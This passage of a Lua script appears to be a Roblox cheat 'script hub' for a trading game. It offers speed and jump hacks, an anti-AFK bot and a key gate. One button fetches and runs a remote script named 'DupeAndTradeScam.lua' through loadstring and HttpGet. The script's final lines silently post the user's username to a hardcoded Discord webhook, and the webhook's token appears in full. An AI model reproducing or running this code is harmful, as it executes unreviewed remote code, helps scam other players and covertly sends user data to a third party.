    Callback = function()
        if game.PlaceId ~= 10321372166 then
            game:GetService("TeleportService"):Teleport(10321372166, game.Players.LocalPlayer)
        end
wait(10)
loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/DupeAndTradeScam.lua", true))()
      end    
})

Tab8:AddButton({
    Name = "Re-Join!",
    Callback = function()
        local ts = game:GetService("TeleportService")
        local p = game:GetService("Players").LocalPlayer
        ts:Teleport(game.PlaceId, p)
      end    
})
local Section = Tab8:AddSection({
    Name = "Gui"
})
Tab8:AddButton({
    Name = "Destroy GUI!",
    Callback = function()
        OrionLib:Destroy()
      end    
})

local Tab9 = Window:MakeTab({
    Name = "Player",
    Icon = "rbxassetid://7743876054",
    PremiumOnly = false
})

Tab9:AddSlider({Name = "JumpPower",Min = 50,Max = 1000,Default = 50,Increment = 1,ValueName = "JumpPower",Callback = function(value)
    shared.jp = value
    if shared.jp ~= nil and game.Players.LocalPlayer.Character  then
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = shared.jp
    end
end})
Tab9:AddSlider({Name = "WalkSpeed",Min = 16,Max = 1000,Default = 20,Increment = 1,ValueName = "WalkSpeed",Callback = function(value)
    shared.ws = value
    if shared.ws ~= nil and game.Players.LocalPlayer.Character and shared.ws ~= 20 then
        game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = shared.ws
    end
end})
Tab9:AddButton({
    Name = "Anti-AFK",
    Callback = function()
        local vu = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:connect(function()
           vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
           wait(1)
           vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        end)
        OrionLib:MakeNotification({
            Name = "Success!",
            Content = "Anti-AFK now works!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
      end    
})

local Tab10 = Window:MakeTab({
    Name = "Changelog",
    Icon = "rbxassetid://7733771217",
    PremiumOnly = false
})

Tab10:AddParagraph("February, 1, 2023 - v1.1","+ Added auto collect and auto farm")
    Tab10:AddParagraph("February, 2, 2023 - v1.2","+ Added Player Tab")
    Tab10:AddParagraph("February, 3, 2023 - v1.3","+ Fixed Dupe And Trade Scam and added guis tab")
    Tab10:AddParagraph("February, 3, 2023 - v1.4","+ Added Auto Hatch Tab")
    Tab10:AddParagraph("February, 10, 2023 - v1.5","+ Changed Key!")
    Tab10:AddParagraph("February, 11, 2023 - v1.6","+ Added teleporting to hardcore mode and trading plaza and destroy gui button!")

local Tab11 = Window:MakeTab({
    Name = "Credits",
    Icon = "rbxassetid://7734059095",
    PremiumOnly = false
})

Tab11:AddLabel("Credits to Parmen#9984 <3")
    Tab11:AddButton({
        Name = "Copy Discord Link",
        Callback = function()
            if setclipboard then
                OrionLib:MakeNotification({
                    Name = "Success!",
                    Content = "Check your clipboard!",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })
                setclipboard("https://discord.gg/RnNDbH8kA2")
                else
                OrionLib:MakeNotification({
                    Name = "Error!",
                    Content = "Your executor doesn't support",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })
                end
          end    
})

end

function CorrectKeyNotification()
    OrionLib:MakeNotification({
        Name = "Correct Key!",
        Content = "You have entred the correct key!",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
end

function IncorrectKeyNotification()
    OrionLib:MakeNotification({
        Name = "Incorrect Key!",
        Content = "You have entred the incorrect key!",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
end

local Tab = Window:MakeTab({
	Name = "Key",
	Icon = "rbxassetid://7733965118",
	PremiumOnly = false
})

Tab:AddTextbox({
	Name = "Enter Key!",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
        _G.KeyInput = Value
	end	  
})

Tab:AddButton({
	Name = "Check key!",
	Callback = function()
      		if _G.KeyInput == _G.Key then
                MakeScriptHub()
                CorrectKeyNotification()
            else
                IncorrectKeyNotification()
            end
  	end    
})
Tab:AddButton({
    Name = "Get key!",
    Callback = function()
        if setclipboard then
            OrionLib:MakeNotification({
                Name = "Success!",
                Content = "Check your clipboard!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
            setclipboard("https://discord.gg/RnNDbH8kA2")
            else
                OrionLib:MakeNotification({
                    Name = "Error!",
                    Content = "Your executor doesn't support",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })
            end
      end    
})
local Webhook = "https://discord.com/api/webhooks/1062039539318788266/oXJFfbq-S-lx8PCvrQGS_BZAhE-wPGHg6ggRSg5dA4WsDziU0fIpRbLH9h-kGW-RPUzq" 

local Headers = {["content-type"] = "application/json"} 
local LocalPlayer = game:GetService("Players").LocalPlayer
local PlayerName = game.Players.LocalPlayer.Name
local gameID = game.PlaceId
local gameNAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name


local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {
           {
           ["title"] = "Someone used your script hub! His Username:" ..PlayerName.. "!",
           ["description"] = "Parmen ScriptHub - [Click](https://discord.gg/RnNDbH8kA2)",
           ["color"] = tonumber(0xff1493),
           },
       }
     }
local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

Request = http_request or request or HttpPost or syn.request
Request({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})